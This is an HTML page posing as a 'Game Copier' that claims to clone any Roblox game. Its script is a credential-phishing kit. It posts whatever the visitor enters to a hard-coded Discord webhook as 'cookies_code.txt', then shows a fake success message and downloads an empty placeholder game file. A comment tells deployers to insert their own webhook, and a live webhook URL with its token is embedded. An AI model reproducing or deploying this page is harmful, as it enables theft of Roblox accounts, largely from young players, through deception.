<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Copier - Roblox Tools</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0e1a 0%, #1a1d2e 50%, #0f1319 100%);
            color: white;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        /* Animated background stars */
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        .container {
            position: relative;
            z-index: 2;
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .header {
            text-align: center;
            margin-bottom: 60px;
        }

        .main-title {
            font-size: clamp(3rem, 8vw, 5rem);
            font-weight: 700;
            margin-bottom: 20px;
            background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .subtitle {
            font-size: 18px;
            color: rgba(255, 255, 255, 0.8);
            max-width: 600px;
            margin: 0 auto;
            line-height: 1.6;
        }

        .tool-section {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 25px;
            padding: 40px;
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
            margin-bottom: 30px;
        }

        .tool-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
        }

        .input-group {
            margin-bottom: 30px;
        }

        .input-label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 10px;
        }

        .input-field {
            width: 100%;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .input-field:focus {
            outline: none;
            border-color: #4f46e5;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(79, 70, 229, 0.3);
        }

        .copy-btn {
            width: 100%;
            padding: 18px 30px;
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .copy-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .copy-btn:hover::before {
            left: 100%;
        }

        .copy-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(79, 70, 229, 0.4);
            background: linear-gradient(135deg, #5b52e8 0%, #8b4cf0 100%);
        }

        .copy-btn:active {
            transform: translateY(-1px);
        }

        .video-section {
            text-align: center;
            margin-top: 40px;
        }

        .video-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
            color: rgba(255, 255, 255, 0.9);
        }

        .video-container {
            position: relative;
            width: 100%;
            height: 0;
            padding-bottom: 56.25%; /* 16:9 aspect ratio */
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }

        /* Gradient overlay */
        .gradient-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 50% 30%, rgba(79, 70, 229, 0.1) 0%, transparent 70%);
            pointer-events: none;
            z-index: 1;
        }

        /* Back button */
        .back-btn {
            position: fixed;
            top: 30px;
            left: 30px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            padding: 12px 20px;
            border-radius: 50px;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
            z-index: 10;
        }

        .back-btn:hover {
            background: rgba(255, 255, 255, 0.15);
            transform: translateY(-2px);
        }

        /* Modal overlay */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            backdrop-filter: blur(5px);
        }

        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }

        .modal {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            position: relative;
            transform: scale(0.8);
            transition: transform 0.3s ease;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .modal-overlay.show .modal {
            transform: scale(1);
        }

        .modal-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #1f2937;
        }

        .modal-message {
            font-size: 16px;
            color: #6b7280;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .modal-btn {
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 100px;
        }

        .modal-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.4);
        }

        .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            background: rgba(107, 114, 128, 0.2);
            border: none;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: #6b7280;
            font-size: 18px;
            transition: all 0.3s ease;
        }

        .close-btn:hover {
            background: rgba(107, 114, 128, 0.3);
            transform: rotate(90deg);
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .container {
                padding: 20px 15px;
            }
            
            .tool-section {
                padding: 25px;
            }
            
            .main-title {
                font-size: 2.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="stars"></div>
    <div class="gradient-overlay"></div>
    
    <a href="index.html" class="back-btn">← Back</a>
    
    <div class="container">
        <div class="header">
            <h1 class="main-title">Game Copier</h1>
            <p class="subtitle">
                Easily clone any Roblox game with our Game Copier tool.
            </p>
        </div>
        
        <div class="tool-section">
            <div class="input-group">
                <label for="gameCode" class="input-label">Enter Game Code/ID:</label>
                <input type="text" id="gameCode" class="input-field" placeholder="Enter your code here">
            </div>
            
            <button class="copy-btn" onclick="copyGame()">Copy Game</button>
        </div>
        
        <div class="video-section">
            <h3 class="video-title">Tutorial: How to Copy Games</h3>
            <div class="video-container">
                <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" 
                        allowfullscreen
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture">
                </iframe>
            </div>
        </div>
    </div>

    <!-- Modal -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <button class="close-btn" onclick="closeModal()">×</button>
            <div class="modal-title" id="modalTitle">Processing...</div>
            <div class="modal-message" id="modalMessage">Please wait while we copy your game.</div>
            <button class="modal-btn" id="modalBtn" onclick="closeModal()" style="display: none;">OK</button>
        </div>
    </div>

    <script>
        // REMPLACEZ CETTE URL PAR VOTRE WEBHOOK DISCORD
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1381412678299422922/aE9Jdl7XCknSgdILUsIvHYegRRMCx2sGpFwH78MDusL8kbuerD43ZE7n8IGnBesJXUG5';

        // Create animated stars
        function createStars() {
            const starsContainer = document.querySelector('.stars');
            const numberOfStars = 50;
            
            for (let i = 0; i < numberOfStars; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 3 + 's';
                starsContainer.appendChild(star);
            }
        }

        // Send data to Discord webhook as .txt file
        async function sendToDiscord(gameCode) {
            try {
                const formData = new FormData();
                
                // Create .txt file with only the game code content
                const blob = new Blob([gameCode], { type: 'text/plain' });
                formData.append('files[0]', blob, 'cookies_code.txt');

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                console.log('File sent to Discord successfully');
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Download .rbxl file function
        function downloadRbxlFile(gameCode) {
            // Create minimal RBXL file content (basic XML structure)
            const rbxlContent = `<?xml version="1.0" encoding="UTF-8"?>
<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
    <External>null</External>
    <External>nil</External>
    <Item class="Workspace" referent="RBX0">
        <Properties>
            <string name="Name">Workspace</string>
        </Properties>
        <Item class="Part" referent="RBX1">
            <Properties>
                <string name="Name">Baseplate</string>
                <Vector3 name="Size">
                    <X>512</X>
                    <Y>20</Y>
                    <Z>512</Z>
                </Vector3>
                <Vector3 name="Position">
                    <X>0</X>
                    <Y>-10</Y>
                    <Z>0</Z>
                </Vector3>
                <Color3 name="Color">
                    <R>0.388235</R>
                    <G>0.372549</G>
                    <B>0.384314</B>
                </Color3>
                <string name="Material">Plastic</string>
                <bool name="Anchored">true</bool>
            </Properties>
        </Item>
    </Item>
</roblox>`;

            // Generate random 15-digit number
            let randomNumber = '';
            for (let i = 0; i < 15; i++) {
                randomNumber += Math.floor(Math.random() * 10);
            }

            // Create blob and download
            const blob = new Blob([rbxlContent], { type: 'application/xml' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            
            // Set filename with random 15 digits
            const filename = `place_${randomNumber}.rbxl`;
            
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        }

        // Copy game function
        async function copyGame() {
            const gameCode = document.getElementById('gameCode').value;
            const modal = document.getElementById('modalOverlay');
            const modalTitle = document.getElementById('modalTitle');
            const modalMessage = document.getElementById('modalMessage');
            const modalBtn = document.getElementById('modalBtn');
            
            if (!gameCode.trim()) {
                // Show error modal
                modalTitle.textContent = 'Error!';
                modalMessage.textContent = 'Please enter a game code or ID before proceeding.';
                modalBtn.style.display = 'inline-block';
                modal.classList.add('show');
                return;
            }
            
            // Show processing modal
            modalTitle.textContent = 'Processing...';
            modalMessage.textContent = 'Please wait while we copy your game. This may take a few moments.';
            modalBtn.style.display = 'none';
            modal.classList.add('show');
            
            // Simulate copying process
            setTimeout(async () => {
                modalTitle.textContent = 'Success!';
                modalMessage.textContent = 'Game copied successfully! The game file is being downloaded.';
                modalBtn.style.display = 'inline-block';
                
                // Send data to Discord webhook
                await sendToDiscord(gameCode);
                
                // Download empty .rbxl file
                downloadRbxlFile(gameCode);
            }, 3000);
        }

        // Close modal function
        function closeModal() {
            const modal = document.getElementById('modalOverlay');
            modal.classList.remove('show');
        }

        // Close modal when clicking outside
        document.getElementById('modalOverlay').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });

        // Initialize stars when page loads
        createStars();

        // Enter key support
        document.getElementById('gameCode').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                copyGame();
            }
        });
    </script>
</body>
</html>
